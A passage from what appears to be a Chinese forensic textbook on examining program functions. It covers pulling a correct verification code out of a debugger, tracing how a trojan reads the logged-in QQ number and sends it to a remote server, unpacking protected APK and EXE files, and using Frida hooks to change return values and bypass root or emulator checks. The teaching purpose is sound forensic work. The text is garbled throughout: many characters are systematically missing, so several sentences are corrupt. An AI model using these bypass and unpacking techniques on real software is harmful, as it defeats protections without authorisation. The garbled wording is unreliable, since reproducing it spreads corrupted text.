返回JEB中，可查看调试窗口中的局部变量下记录的安全防护APP对验证码进判断过程中所产生的变量的值。其中v4就是我们输入的值，v0所存储的值就是正确的验证码，如图19-48所示。

![](images/17f6fd5e549e330d2fdc2aaa1038190974abb59c896f266e3c8657bf617b7ce2.jpg)  
图19-47程序的运行界面

![](images/509c2e89f924ca5a239e8022de10c347ee749962d70ae35af5b3ed3b2e9840bc.jpg)  
图19-48查看调试窗口

由于所获取的值都是String类型的，因此将vO和v4的值转换为String类型，即可看到输和真实验证码的原始字符串，如图19-49所示。

![](images/7d1562dc41f5497a32a677f4543bd6c51f8a6792fbb7661122794b05f546f056.jpg)  
图 19–49 查看局部变量的值

断开调试后重新在模拟器中运安全防护APP，输入获取的真实验证码110即可进入应用内，如图19-50所示。

![](images/a2011b3ac06acb833658b3cb4fdb48208042fad5b02b98d6634c2dc179719525.jpg)

## 2.计算机木马程序动态调试

计算机程序的动态调试，多是通过IDA、OllyDbg或x64dbg等软件完成，在进行动态调试的过程中，最基本的操作是下断点调试，因此寻找下断点的位置就是动态调试需要做的第一步。断点

图19-50输入获取的真实验证码110

位置一般是特定的函数入口，函数可以是程序中调用的自定义函数，也可以是系统函数，对自定义函数下断点的前提是已通过IDA静态分析，对该函数的功能有所了解，或是先前调试过程中单步调试过该函数的调用位置，对该函数执行后对系统产生的影响有一定了解。而在系统函数调用位置下断点则简单得多，OllyDbg等软件能够识别系统函数库文件以及相应的WindowsAPI，在自定义函数执行关键操作的过程中，如对文件系统的读写操作、和远程服务器通信以及修改注册表等操作，底层逻辑仍然是通过调用WindowsAPI实现上述功能。因此对WindowsAPI等系统函数进行下断点操作，如读写文件对应的WindowsAPI——ReadFile和WriteFile等，能快速地帮助逆向人员定位到程序关键操作的函数和位置。

本章节介绍的案例为一个木马程序，该程序具体获取电脑QQ登录会话并将获取到的数据上传至远程数据库的功能。为了弄清该程序获取本机登录的QQ号码的机制，需要了解

WINDOWS系统窗口相关的机制：首先是打开的所有程序都有对应的窗口名或者类名，在电脑中登录QQ后，会创建一个标题栏中包含QQ号的窗口，而Windows 系统提供了相应的获取窗口标题的接口GetWindowTextA，官方对它的解释是“如果指定窗口具有标题栏，则将标题栏的文本复制到缓冲区中，如果指定窗口是控件，则将控件的文本复制到缓冲区中”，因此只需要在程序中调用它即可获取窗口标题。所以该程序很有可能是通过WindowsAPI获取了这个窗口的标题栏，从而获取到本机登录的QQ号码。其次是Windows 提供了检索窗口的接口FindWindowA，官方的解释是“检索顶级窗口的句柄，该窗口的类名称和窗口名称与指定的字符串匹配。如果字符串参数为NULL，则所有窗口名称都匹配。”因此这个接口可用来在Windows查找所有运行的带窗口的程序。

在虚拟机中，使用IDA加载检材程序，找到获取QQ相应的代码，如图19-51所示。

![](images/083a993050c8030ceb5f728e1dd860e4272a745d996ea5ea1ddb4e5c861b9a27.jpg)  
图19-51使用IDA获取QQ相应的代码

此处代码说明该程序通过调用另一个WindowsAPI函数FindWindowA，查找具有CTXOPConntion_Class类（QQ程序的窗口类名)的顶层窗口句柄hWnd。如果找到符合条件的窗口，则进入一个循环，通过调用上述提到的GetWindowTextA 函数，获取当前窗口的标题栏文本，即包含QQ号码的字符串，然后使用循环的方式将QQ号码从字符串中取出。

为了验证检材程序是否使用了上述遍历的方式获取本机QQ号，先在本机登录测试QQ，再使用OllyDbg工具加载检材程序，并使用“API断点设置工具”，设置GetWindowTextA为断点，当程序获取窗口标题时，会自动断点，如图19–52所示。

开始调试程序，发现检材程序最终获取了包含本机登录的QQ号码的窗口标题，如图19-53所示。

在虚拟机中打开Wireshark抓包，对具体的报文进行详细分析，可获取木马程序回传数据的IP地址，如图19-54所示。

## (五)动态脱壳

## 1.APP 加固与脱壳

APP加固也被称为加壳，是Android逆向中最难绕过的保护手段，也是本章介绍的重点，即使用了代码混淆的方式，java代码仍然是裸露的，代码逻辑仍能被分析出来，而加固的目的就是将java代码隐藏起来，除破解其加固算法，运逻辑与上述动态加载类似，只有在程序运时，才释放出真正的代码。

![](images/4075288758a543a9aef29f5f89a3e7e3b22221430d0e8457978ca8460160f495.jpg)  
图19-52 API断点设置工具界面

![](images/d02da1f109dd89d4ce20bee948c6ca994f7ceb2c37c292ace4a9e1def0074def.jpg)  
图19-53 获取包含本机登录的QQ号码的窗口标题

![](images/05d75caee3cec99a9c553cf1e63afbf4ac627584faf48577d5716cdff5770d25.jpg)  
图19-54获取马程序回传数据的IP地址

学习本章节讲述的动态脱壳技术前，需要先了解加固的式和逻辑，先介绍一下APP加固发展的三个阶段：

（1）DEX整体加固 第阶段也被称为代壳，被认为是对DEX整体加固,APP加固的核逻辑是将DEX整体加密后动态加载。APP整体加固是先对加密的件进解密操作，再写另一个件，然后通过DexClassLoader或其他类加载器加载解密后的件，但此过程件操作过于明显，于是进步发展出将加密的DEX在内存中解密并直接在内存中加载的技术，该过程避免了写件的操作，但只要在内存中搜索DEX件头或是在加载DEX件的函数处设置断点，再进Hook操作即可从内存中获取解密后的数据。

对于代壳的脱壳式,GitHub上提供了许多优秀的脱壳脚本，这列举其中两例：

## a) Frida-Apk-Unpack

GitHub 地址：https://github.com/GuoQiang1993/Frida-Apk-Unpack。

基于Frida的脱壳项目Frida-Apk-Unpack，提供脱壳脚本dexDump.js，该脚本利用Frida框架libart.so中的OpenMemory或OpenCommon(AndroidN以后）方法进Hook,获取内存中dex的地址，计算出dex文件的大小，从内存中将dex导出。

使法：在机/虚拟机上启动frida server，在连接机的电脑上执命令“frida-U-fcom.xxx.xxx-I dumpDex.js--no-pause",脱壳后的dex保存在/data/data/应用包名/目录下。

## b) frida_dump

GitHub 地址：https://github.com/rOysue/frida_dump。

基于Frida的脱壳项目frida_dump，提供脱壳脚本dump_dex.js,该脚本实现脱壳的式与项目Frida-Apk-Unpack类似，选择Hook 的函数为模块 libart.so 中的OpenCommon（）。

（2）代码抽取保护 根据对上述脱壳脚本实现原理的分析可知，DEX整体加固，即一代壳的致命之处在于将代码段完整地存储在内存中，反编译者通过定的动态调试、下断点、Hook函数等操作能够将代码段完整地从内存中取出，于是就出现了第二代代码保护机制。

二代壳又被叫作代码抽取保护。这种加固式的关键在于核心代码数据并不与DEX件的整体结构放在一起，就算DEX件被完整地从内存中提取出来，也无法看到真正的代码，如同Frida-Apk-Unpack项作者在描述的脱壳脚本的使环境时所说的“普通加固可以脱壳，对于类抽取等加固脱出的只是个空壳”，很好地说明了使用二代壳加固后，通用的一代壳脱壳脚本已不再适于使代壳加固后的APK程序。

二代壳的加固原理是利用私有函数，通过对自身进程的Hook来拦截函数被调用时的路径，在抽取的函数被真实调用前，将无意义的代码数据填充到对应的代码区中。该种方法存在一定的兼容性和性能损耗的问题，为此应用的开发者一般不会选择对应内的全部代码使用此方式进行保护，特别是对于无关的第三方库的代码，考虑到性能问题，代码抽取保护通常在函数被第次调后就不再置空函数，由此也使一些从内存中把DEX整体dump下来的案仍然可，只需要在dump之前多触发次程序逻辑，就能获得更完整的DEX件。

应对代壳,在GitHub上同样有不少优秀的脱壳脚本,这列举其中两个脚本：

## 1) dumpDex

GitHub地址:https://github.com/CvT/dumpDex/blob/master/dump.py

该脚本采内存重组脱壳法,通过解析内存中DEX的格式，将其重新组合成DEX，以实现DEX代码的还原。该脚本的核心在于在内存中定位到DvmDex结构体，其存储了数据结构pDexFile，遍历其内容即可获取到DEX的完整内容。

## 2) DexHunter

GitHub 地址：https://github.com/zyq8709/DexHunter。

DexHunter是针对代壳的通脱壳具，其原理是通过动加载DEX中的所有类并dump出所有法对应的代码，最后将代码重构再填充回被抽取的DEX中。

(3)VMP与 Dex2C 三代壳的保护手段有一个重要的特点，是将所有的Java代码转变为Native层代码。VMP加固的核原理是基于Dalvik的解释器实现定义的指令。如要对MainActivity中的onCreate进VMP加壳保护，从实现过程讲要解决两个关键问题：

1）让系统进到加固壳代码执onCreate；

2）壳代码得到运时机后，如何解释原来的onCreate。

对于上述问题，不同厂家使用各类方法将系统调用到onCreate时转而指向壳代码，如把onCreate变为native函数，在存储加固代码的so文件中动态注册onCreate，或者成Java_xxx_onCreate形式的native函数。

Dex文件中对于每一个函数，都会有一个Codeltem字段，保存了这个函数的各种信息，其中包括函数的指令。在加固时，将这些指令抽取出来保存，并且删除Dex中的指令。在保存指令前，各家厂商会对指令做些变换，以适应的虚拟机。

当壳代码需要执onCreate时，会从已保存的指令中取出属于onCreate的指令，解析出指令的opcode/operand,通过个switch case找到处理对应opcode的函数，然后执。

Dex2C技术则是通过编译原理相关知识将原本的Java代码转化为native层代码，加固时把Java代码转换成NDK层的二进制代码，该过程解决了性能和兼容性问题。由于二进制转换是在加固期间做的，加固后的APK包是转换后的二进制结果，该过程是不可逆的，也因此大地提了安全强度。 欢迎关注法律类微信公众号【善雅集】

由于三代加固多是企业级加固，且多为收费服务，相比一代壳和代壳，安全性被抬到了个新的度，对逆向分析作的难度也进一步加。

## 2.EXE程序的加固

与APP安全案类似，计算机程序(EXE)以及计算机中的动态链接库件(DLL)也存在混淆、加固等安全保护案，对于计算机程序加壳的类型常见地分为压缩壳和加密壳。

PE文件分为PE头和数据两部分，压缩壳是通过将PE文件的数据部分进行压缩，并将PE头、解压代码以及压缩数据重新组合为新的PE件。使用压缩壳后程序在运时需要先进解压操作，以此方式保护程序的数据部分。

这种壳的优点是简单易，般不会对软件程序造成太的影响,同时还可有效地防静态反汇编和静态调试。但是，压缩壳的缺点是，由于采用了压缩和加密技术，解压和解密操作都需要耗费一些时间，可能会导致软件的运速度变慢。

压缩壳的特点是减小软件体积大小，加密保护不是其重点，但通过简单的反编译手段也无法看到程序运的核心代码。目前兼容性和稳定性比较好的压缩壳有UPX、ASPack、PECompact等。

加密壳则是通过对程序使用算法加密、混淆、模糊与隐藏，使得逆向人员无法轻易地通过反编译和调试获取程序运的真正内容，其反调试、反跟踪的特性保护了程序的安全性。加固法则与压缩壳类似，即将加密后的数据与解密代码重新组合成PE件。常见的加密壳有ASProtect、Armadillo等。

加密壳种类比较多，不同的壳侧重点不同，些壳单纯保护程序，另些壳还提供额外的功能，如提供注册机制、使用次数、时间限制等。

在加密壳当中除了算法加密外，另一类更加强大的防护为虚拟机保护，即VM壳，该种保护法将程序可执代码转化为定义的中间操作码，操作码通过定义的解释器进解释和执，实现程序原来的功能。基于虚拟机保护的加密壳发展至今，已经能达到极其复杂的加密混淆效果，最具代表性的VM壳如VMProtect。

## 3.EXE程序的脱壳基本流程

根据上述介绍，可了解经过常见的压缩壳和加密壳加固的程序的运过程分为以下三步：

执行壳代码；壳代码中的解密/解压代码释放真正的程序代码；将真实的程序代码载入内存。

该过程中明确存在某一个时间点，壳代码将释放真正的程序代码，依据该思路，在对EXE程序脱壳的过程中，将脱壳的通用流程概括为脱壳三步法：①寻找原始OEP;②dump内存到文件；③修复文件。

在解释“脱壳三步法”前，需要先解释下在EXE脱壳相关领域内的常概念：

OEP：程序最开始执行的地方。

原始OEP：加壳程序的口称为OEP，而程序原本的点即原始OEP。

dump内存：将内存中的数据或代码转储到本地。

IAT：导入地址表，其中包含程序所有使用的DLL模块名称及导人的函数名称或函数序号，通过该表windows加载器会定位所有导入的函数或数据将定位到的内容填写至程序的某个位置供其使用。

修复IAT：在将程序真正的代码从内存dump到本地后，该文件无法直接运行，因为加壳后的导地址表无法适配脱壳后的程序。

根据上述概念，现在再看“脱壳三步法”的完整流程：

（1）寻找原始OEP 意在找到加固后程序原本的程序口点，当壳代码执结束后，会进一次跨度较大的跳转，通常代表从壳代码跳转至程序原本的口点。

(2）dump内存到文件找到原始OEP后，下一步工作就是将从该OEP处开始，该步骤的主要作是将程序原本的代码完整地提取出来，该过程还需要找到程序代码执结束的位置。

（3）修复文件即修复IAT 根据上述概念介绍，从内存中dump下来的文件无法正常运，必须在修复其导地址表后才能使程序内模块及函数被正确调用。

## 4.Upx手动脱壳案例

本次案例取自一道CTF题，样本名为“新年快乐.exe”，使用ExeinfoPE查看该软件基本信息，发现该样本使用upx加固，且为32位程序，如图19-55所示。

![](images/79f81902acef87bad7f5059eb8f1896bd02f021b3075338cf96c8646fa2c0f44.jpg)  
图19–55使用ExeinfoPE查看基本信息

upx为一款开源的压缩壳工具，现如今对于upx壳已有很多自动脱壳的工具了，包括官upx命令也提供upx-d文件名.exe的还原命令。但想要深学习脱壳原理，还需要通过动调试的方式完成脱壳。

根据“脱壳三步法”，首先需要找到原始OEP。Upx压缩壳的特征之一是，其OEP代码被包含在PUSHAD/POPAD指令之间。并且，跳转到 OEP代码的JMP 指令紧接着出现在POPAD指令后。使用x32dbg加载该程序后，发现其入口处即为pushad的位置，是一个典型的pushad/popad 结构，如图 19–56 所示。

![](images/303ecf61d581be808d0ef01da44c62693498de7c8d2a90f6b27f921d1b814cbb.jpg)  
图19–56 入口处即为 pushad

一般加壳的程序，是先运行壳，在内存中还原程序，然后跳转到原始OEP，开始执行源程序代码。既然先运行壳，那就必然进入壳程序然后再退出壳程序，其间要遵守堆栈平衡（进入前和退出后的栈指针是相同的)，即壳退出后，必然会操作堆栈指针为进入前的堆栈指针，此类情况被称为“平衡堆栈”，又称ESP定律。

利用该特性，在通过pushad后，在寄存器ESP地址对应的内存窗口设置4字节的硬件断点，然后F9运行至程序中断，如图19-57所示。

![](images/0006384ff1f55b238f709b283035f840f1d3ef1b92334beac7b828493a6bcf9e.jpg)  
图19-57设置4 字节的硬件断点

程序中断后，查看汇编窗口的上下文，发现popad在附近，且在下方存在一个较大跳跃的jmp指令，与跳转至程序真实代码的特征相符。由此判断原始OEP位置为“00401280”，如图19-58所示。

![](images/a4e6f53743d50f7e713daa0892768bd576e059970b7baaa319a687e23104e454.jpg)  
图19-58 查看汇编窗的上下

第步需要从原始OEP位置进dump操作。在“jmp新年快乐.401280”处设置断点，并单步步过此断点，使x32dbg带的插件Scylla对此处内存进dump操作,如图19–59所示。

![](images/bb483490333505add71d81ce79a1a4a476af21f1f5c63c67be4ebba745786825.jpg)  
图19-59 设置断点

导出后得到件“新年快乐_dump.exe”，但此时由于IAT不匹配，程序还法正常运。于是就进到第三步，修复件。Scylla插件持搜索IAT的功能，可在“Misc→Options”窗内勾选“UseadvancedIATsearch”。勾选后,在Scylla界内先点击“IATAutosearch”寻找IAT表对应的地址和,再点击“GetImports”获取到导出函数，如图19-60所。

完成上述操作后，点击“FixDump”按钮,选择上述导出的“新年快乐_dump.exe”件,如图19–61所，对该件进修复。

![](images/a04ac77e3bf5751b988fa9fcdfb337c3a2f9017f834494c4a3e03f42eac8230f.jpg)  
图19-60 点击“Get Imports”获取到导出函数

![](images/7f39836317666ce69e6cc5e061fbd521a4a77a587ce135ed964aa45271b7c86b.jpg)  
图19-61 导出的“新年快乐_dump.exe”

运完成后得到件“新年快乐_dump_SCY.exe”,即修复完成，经测试可正常运，且使ExeinfoPE查看该软件基本信息，发现已不含UPX壳，如图19-62所。

![](images/54e59201671bad911838e9c9f96239fc5ff9f5165a7b42bfbf435df8b90842d1.jpg)  
图19-62使用ExeinfoPE查看该软件基本信息

## (六）Hook技术

Hook技术是种“劫持”程序原有执流程,添加额外处理逻辑的种技术。这项技术的应用场景很多，比如某个APP程序通过反编译查看其编译代码，却发现其中的某个链接通过加密的方式保存在了本地，这时可通过Hook的方式主动调用发送该链接请求的方法，并打印该链接。当然Hook还能通过修改法返回值的技巧绕过些验证逻辑，如APP应检测模拟器、代理、root等通过本地检验的判断逻辑，都可通过Hook修改关键法返回值的式进绕过。

本章将介绍基于Frida框架的Hook操作，Frida是一款功能强大的动态插栓工具，支持对Windows(EXE）、Linux(ELF)以及Android平台（APK)的可执行文件的Hook，能够熟练地使用Frida应对各个平台的各类应进自定义Hook操作，将有效地提升逆向作的效率。

## 1. Frida 环境搭建

虽然安装Frida很简单，但还是需要环境上的准备，开始安装前请确认一下系统环境：

1)Python3.x建议使用新版本；

2)Windows, macOS,或者 GNU/Linux。

Frida使用Python带的pip具即可安装，安装时需要先安装Frida-tools,安装命令为“pip install frida-tools",然后再安装frida，安装命令为“pip install frida”。安装完Frida后，使用命令“frida--version”可查看到Frida的版本即代表安装成功。

对远程设备或者本地模拟器设备进行测试，仅仅在本地安装Frida还不够，还需要在远程环境安装并执行指定版本的frida-server，需要注意的是Frida版本和frida-server版本必须一致，并且frida-server的架构和位数必须和测试环境一致，比如本地Frida版本为14.2.18,frida-server版本也需要为14.2.18，而用于测试的手机模拟器使用的是X86架构64位安卓系统，则选择frida-server时必须选择frida-server-14.2.18-android-x86_64.xz，即X86架构64位的frida-server。

## 2. Frida基础

Frida操作APP的式有两种，种是spawn模式，该模式在启动时就开始对应用进Hook，如果程序已经启动，则会重启程序，在命令行通过frida命令的“-f”参数加目标包名来选择spawn模式;另一种是attach模式，该模式从目标程序当前的状态开始Hook，不需要重启程序，也获取不到命令执前的应用数据，在命令通过frida命令不添加“-f”参数将进attach模式。Frida命令常的参数如表19-1所。

表19-1 Frida命令常用的参数
<table><tr><td>参 数</td><td>用 法</td></tr><tr><td>--version</td><td>查看本地frida版本</td></tr><tr><td>-D ID, --device=ID</td><td>使用设备 ID连接设备</td></tr><tr><td>-U, -usb</td><td>连接USB设备</td></tr><tr><td>-R, --remote</td><td>连接远程 frida-server</td></tr><tr><td>-H HOST, --host=HOST</td><td>通过host连接远程 frida-server</td></tr><tr><td>-f FILE, --file=FILE</td><td>spawn 模式</td></tr><tr><td>-F,attach-frontmost</td><td>使用attach 模式Hook当前启动的最顶端程序</td></tr><tr><td>-1 SCRIPT, --load=SCRIPT</td><td>加载 JavaScript 脚本</td></tr><tr><td>--no-pause</td><td>强制重启程序</td></tr></table>

## 3.Java层Hook基本方法

（1）Java模块介绍 介绍Java层Hook的法前需要先介绍下Frida为户提供的JavaScriptAPI中Java模块的部分：

1）Java.available：返回布尔类型，表当前进程中是否存在完整可的Java虚拟机环境，Java虚拟机可以是Dalvik或者Art，般在Java.Perform（）内执，于检测Java.Perform(）是否执成功，如图19–63所。

![](images/c0dbfddb56c94e507ca63affdedfe6d6e45c526146ce03cd2010c9257f690d4c.jpg)

2）Java.enumerateLoadedClasses(callbacks）：枚举当前进程中已加载的类,每次枚举到加载的类回调callbacks：

图19-63查看Java.Perform()

onMatch:function(className）：枚举个类，以类名称进回调，该类名称后续可作为Java.use（）的参数来获取该类的个引对象。

onComplete:function（）：所有的类枚举完毕后调,如图19-64所。

![](images/3c76bed64aea77e8aef7c324ba69c41fb25d199abd74d27076750af3d0afe962.jpg)  
图19-64 枚举已加载的类

3）Java.enumerateLoadedClassesSync（）：同步枚举所有已加载的类，返回个数组。

4）Java.use(className）：动态获取className的类定义，返回个类句柄。返回的句柄能通过\$new（)实例化对象,也能通过\$dispose()销毁对象,如图19-65所。

![](images/02edc3610cbe384badb1c2f4aa9840357a0b6490fa307af970406f32f994838d.jpg)  
图19-65 通过\$new()实例化对象

5）Java.scheduleOnMainThread(fn）：在虚拟机主线程上执函数fn。

6）Java.choose(className,callbacks)：在Java的内存堆上扫描指定类名称的Java对象，每次扫描到个对象，则回调callbacks：

onMatch:function(instance）：每次扫描到个实例对象时被调,instance为搜索到的实例对象。

onComplete:function(）：当扫描结束之后进回调，如图19–66所。

![](images/e36dcce004288148331c194df4e3d9320c8aeca8398cb9089f9e9032c939b9be.jpg)  
图19–66查看onComplete:function(）函数

(2）准备测试例 使Android Studio编写测试例com.example.testdemo,其中包含2个法，其中fun（）方法和fun2（）法的区别在于fun（）法为静态法，定义包含static关键词，fun2（）法没有static关键词，为实例法，如图19-67所示。

![](images/9f4f7b1860d6b53c1f76e9a71f4a1a21fa124acab3c71fca7c8713fe8169ed11.jpg)  
图19-67 fun()方法和fun2()方法

该程序运后能在志打印窗查看打印结果,如图19–68所。

![](images/c8fe65810cde82a3d4d25d3286a2eace960d9bbba535dfcd32d952040c2df071.jpg)  
图19-68 查看打印结果

(3）打印传参 编写脚本1.js,打印fun（)法被调时的传参数，如图19-69所。

![](images/4ce7565722156614d8233f5f7516e2f2975525cae572f2929bdf9ea9b1ab9230.jpg)  
图19-69 打印传入参数

通过命令“frida-Uf com.example.testdemo.MainActivity --no-pause -1 .\1.js”运行脚本,运结果如下，如图19–70所。

![](images/8f1b61d4907b4a2b2aaced8791eea30a1edd8a4a5b2249a429a467d4c5ee3f51.jpg)  
图19-70运行脚本

该脚本通过Java.use（)获取类句柄，然后重写该类中的法，打印其中参。其中返回时返回内容为“this.fun(x,y)；”代表本次调用原本返回的内容，实际查看日志也可发现日志打印内容不变，如图19–71所示。

![](images/9d7fdf660f46afdfc4d40680933cddd1aa21cd78e3361ff614e1815f1867a227.jpg)  
图19-71 打印入参结果

(4)修改返回值 编写2.js于修改函数fun(）的返回值内容,如图19–72所。

![](images/7edddca46569a9fd28187e602ed909581b77b3b355a08493cee1fdff150a0ee7.jpg)  
图19-72 编写2.js

该脚本执后查看志，发现法fun（）被调后返回的结果为3，传参数与返回值已被修改。志打印结果如下，如图19–73所。

![](images/936c911615bb2462472b4e851495d738447b61eaa31bb4013395aeaad89e3e99.jpg)  
图19-73 志打印结果

(5）主动调用 编写3.js于主动调法fun（)和fun2（），如图19-74所。

![](images/6ffaf82275577a8023f1d8db2492a30375ea1d2bcde44d00084887c8a0d64acf.jpg)  
图19-74 编写3.js

方法fun（）为静态函数，通过类句柄即可进行调用，方法fun2（）为实例方法，需要实例对象才能调用,该情况下需要使用Java.choose（），通过在内存堆中遍历所有已加载的对象，将其中符合筛选条件的实例列出，通过实例来调用fun2（），如图19-75所示。

![](images/507ebffcbf7ca8146c4b233cdc5bad35a6530fbf6b0cf391f0f89eb9c5b0fa7b.jpg)  
图19-75 调用fun2(）

志打印结果,如图19–76所。

![](images/93be2896c1b82388f5312a576e85b15960a21f50734e50f729bd110ac5e05681.jpg)  
图19-76 志打印结果

## 4.Native层Hook基本方法

（1）JNI函数逆向基本流程 在APK件中，对其进解压缩操作，能够发现其中包含目录lib，该路径下包含不同架构下对应的so库文件，so文件是一类动态链接库件，由C/C++语编译成，并且以机器码的形式在CPU上运。由于开发者未必会在打包过程中对每种架构都进编译，so件基于其运模式的特殊性，只能在指定架构的CPU上运，因逆向的第步操作为准备合适的运环境。

进模拟器或机的终端,使命令“uname-a”可查看该模拟器或机的CPU架构，如图19-77所示：

![](images/77099780beded08d64e5f26852fd500cf88b521c9e1dd21636f74efa95429dbd.jpg)  
图19-77 查看该模拟器或机的CPU架构

在逆向JNI函数时,先需要找到Java层函数在native层中对应的函数地址，得到函数地址后才能使Frida进Hook操作，此处介绍Objection可于查看载内存的函数及库件。

Objection具集基于Frida集成了众多脚本于，可通过pip命令安装，使命令“objection-g<包名>explore”可对应进注，如图19-78所，没有找到进程时会以spawn式启动进程。

![](images/4d9c325648b6b1ace8b6cc6ef417788030fdcd90ad59201ae0bd11e18a5deb50.jpg)  
图19-78注入应用

使命令“memory listmodules”可查看该应当前载内存的模块,如图19-79所。

![](images/5e4e61c1c2a0cd3b553ac0ccf625808ae9d40bd97c72c0a45744981dbbbfef0d.jpg)  
图19-79 查看载入内存的模块

通过该列表发现标模块后，可使命令“memory listexports<件名.so>”查看指定模块所有的导出符号名，如图19-80所。

![](images/b0e19f8d0ba232d17f4827d683c1fa94086a0b2bdb5e2c004f705c2146300415.jpg)  
图19-80 查看指定模块所有的导出符号名

(2）准备测试用例 使用AndroidStudio选择NativeC++模板新建项目testdemo2,项目录中增加了cpp件夹,其中包含个cpp件和个编译配置件“CMakeLists.txt”,如图19-81\~图19-83所。

![](images/eb3233235fb03a991de1ebec9d58a194c2a82f2f0ddda70e1a4ac705a2e2c486.jpg)  
图19-81 NativeC++模板

![](images/8a0e880f00a64a6ab8b065ae0af1eb318b3ca0da206ecfd6037c774759b7a26a.jpg)  
图19-82 新建项testdemo2  
图19-83 录中增加cpp件夹

在MainActivity类中通过法System.loadLibrary（）加载动态链接库“native-lib”，并在代码中声明需要调的函数,声明部分的代码中带有关键字native。

修改MainActivity类中的部分代码，在其中添加个while循环确保脚本能够Hook成功。该程序的功能即通过so库中的函数，输出字符串“HellofromC++”。

（3）打印传参和返回值 编写脚本Hook.js,打印函数 Java_com_example_testdemo2_MainActivity_stringFromJNI的两个传参以及返回值,如图19–84和图19–85所。

![](images/c3c02cc7c0dbeb7e97670b1ab83e5d04ee1d558a880d5d0c17a70c293a23a516.jpg)  
图19-84 打印函数的两个传参以及返回值

![](images/77812d20888ec5d4f44b1e6a36d634a8c53aefe23d578fbb101e94d95ce16abc.jpg)  
图19-85 打印结果

Frida接口Module.getExportByName(moduleNamelnull,exportName）用于获取指定so库内导出符号名对应的地址,脚本内对应获取libnative-lib.so库件中的函数Java_com_example_testdemo2_MainActivity_stringFromJNI内存中的地址。

Frida接 Interceptor.attach(target,callbacks）, target为个NativePointer参数，指向想要拦截的函数的内存地址,callbacks参数是个对象，结构如下：

onEnter:function(args）：被拦截函数调之前回调，args中包含传参数,此处可打印、修改传参。

onLeave:function(retval)：被拦截函数调后回调，其中retval表示原始函数的返回值，retval是从NativePointer继承来的，此处可打印、修改返回值。

## 三、程序功能鉴定常见注意事项

在程序功能鉴定作中，如果操作不当可能会导致很多严重的问题，如调试具有破坏性的程序时由于未使沙箱环境或鉴定完成后未及时进环境清理等为导致鉴定设备感染病毒等危险。因此不管在鉴定作开展前、鉴定过程中还是鉴定结束后，都不能掉以轻。

常见注意事项主要有以下点：

1）对送检程序进备份，保证原始数据的完整性，避免鉴定过程中对程序件进修改操作后无法进行还原；

2）由于送检程序多具有破坏性,因此在保存送检程序时需谨慎存放,避免其他不清楚情况的工作人员误点击造成数据泄露或感染病毒等，可将送检程序存放至带密码的压缩包中，使用明显信息进提示；

3）对木马、病毒等类型的程序进鉴定时，需使用沙箱进测试，保证鉴定设备的安全；

4）使虚拟机对程序进鉴定前，需对虚拟机建个快照,并在断情况下调试待检程序，避免通过络感染宿主机，鉴定完成后及时还原快照恢复虚拟机净的状态；

5）程序鉴定过程中，若出现次复现可能会产差异的情况下需按照指定的鉴定规范对会出现变化的步骤进录像。

## 第三节  结

随着信息化时代的快速发展，近年来涉诈骗、传销、勒索等类型案件很多通过特定程序实施，因此越来越多的执法单位需要对涉案程序的性质进判断，因此也就需要委托司法鉴定机构对涉案程序的功能进鉴定，并出具鉴定意见书。

本章首先主要对程序功能性鉴定的步骤进行了详细的阐述，通过各节的知识点能够帮助鉴定人员如何在没有进过功能性鉴定的情况下厘清鉴定思路，了解整个功能性鉴定的大致流程。其次在介绍程序鉴定功能技术时通过实际案例对相应的技术点进巩固,通过理论与实践结合加深阅读者的理解，提阅读者对程序功能性鉴定的能。

![](images/333e44065e002ed4e384cd26ae59edde7ca7894f4a9930568dd1ef835df59f84.jpg)

## ·思考题

1.对本章第二节第节程序逆向下Lua字节码文件逆向中反编译完成的“样本.apk”及获取的Lua脚本进行代码分析。

2.动实现对APK和EXE程序进行脱壳。

3.通过Hook技术Hook相关程序内的指定方法。

## 相关

（相关法条和概念待补充）
